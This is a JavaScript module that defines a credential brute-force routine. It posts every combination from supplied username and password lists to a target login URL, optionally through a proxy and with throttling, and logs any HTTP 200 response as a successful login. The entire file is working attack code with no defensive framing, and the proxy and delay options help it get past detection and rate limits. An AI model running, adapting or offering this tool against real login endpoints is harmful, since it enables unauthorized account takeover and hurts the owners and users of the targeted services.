const axios = require('axios');
const chalk = require('chalk');
const proxySupport = require('./proxy_support');

async function brute(config) {
    const { targetUrl, usernames, passwords, delayMs, maxAttempts, useProxy } = config.smartBrute;
    const results = [];
    let attempts = 0;

    const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;

    for (const username of usernames) {
        for (const password of passwords) {
            if (attempts >= maxAttempts) break;
            try {
                const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: response.status === 200 ? 'Success' : 'Failed',
                    timestamp: new Date().toISOString(),
                    error: ''
                });
                console.log(chalk.cyan(`[ATTEMPT] ${username}:${password} -> ${response.status}`));
            } catch (err) {
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: 'Failed',
                    timestamp: new Date().toISOString(),
                    error: err.message
                });
                console.error(chalk.red(`[ERROR] ${username}:${password} -> ${err.message}`));
            }
            await new Promise(resolve => setTimeout(resolve, delayMs));
            attempts++;
        }
    }
    return results;
}

module.exports = { brute };